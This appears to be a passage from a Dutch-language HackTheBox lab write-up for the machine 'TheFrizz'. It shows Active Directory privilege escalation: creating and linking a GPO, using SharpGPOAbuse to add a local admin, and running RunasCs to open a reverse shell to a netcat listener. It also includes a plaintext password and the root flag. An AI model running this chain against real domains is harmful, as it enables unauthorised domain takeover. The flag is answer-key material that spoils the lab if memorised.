└─$ kinit m.schoolbus@FRIZZ.HTB   
Password for m.schoolbus@FRIZZ.HTB: 

┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ ssh m.schoolbus@FRIZZ.HTB                                                    
PowerShell 7.4.5
PS C:\Users\M.SchoolBus>
```

Ik ben nu weer naar bloodhound geweest en daar kan je het volgende path terug vinden voor administrator te bemachtigen. Je kan hierbij dus zien dat de user M.Schoolbus WriteGPLink rechten heeft op de OU CLASS_FRIZZ. Binnen deze OU is de user V.Frizzle en deze is member van de Administrator group en de Domain admins group. Beide groepen hebben rechten voor hun eigen als administrator te maken.

![[Pasted image 20250717214715.png]]

We zullen een nieuwe grouppolicy gaan aanmaken en ik zal deze de naam root noemen. Ik zal de nieuwe groep gaan linken aan de Domain Admins groep.

```
PS C:\Users\M.SchoolBus> New-GPO -Name root | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes

GpoId       : 94a668e2-24f6-433c-8367-6bffe28c8f74
DisplayName : root
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 3
```



```
PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName root              [+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "root" is: {32916F49-AD36-4B8D-A79B-D092E861A0AC}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{32916F49-AD36-4B8D-A79B-D092E861A0AC}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```



```
PS C:\Users\M.SchoolBus> New-GPO -Name root | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes

GpoId       : 8ef5c007-9bca-4918-a52a-050ec4154c4b
DisplayName : root
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2

PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName root              
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "root" is: {8EF5C007-9BCA-4918-A52A-050EC4154C4B}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{8EF5C007-9BCA-4918-A52A-050EC4154C4B}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!

```



```
PS C:\Users\M.SchoolBus> gpupdate /force                                                                           Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.

PS C:\Users\M.SchoolBus> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
M.SchoolBus
The command completed successfully.

```

login

```
PS C:\Temp> .\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.14.146:4000                                
  
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2ae171$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 3160 created in background.

┌──(kali㉿kali)-[~/HTB/TheFrizz]
└─$ nc -lvnp 4000
listening on [any] 4000 ...
connect to [10.10.14.146] from (UNKNOWN) [10.129.120.67] 55637
Microsoft Windows [Version 10.0.20348.3207]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Zoals je nu kunt zien hebben we een connectie 
root flag: e18e52ab0a292abc91fab81bfd6f0505

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
e18e52ab0a292abc91fab81bfd6f0505
```

![[Pasted image 20250717223932.png]]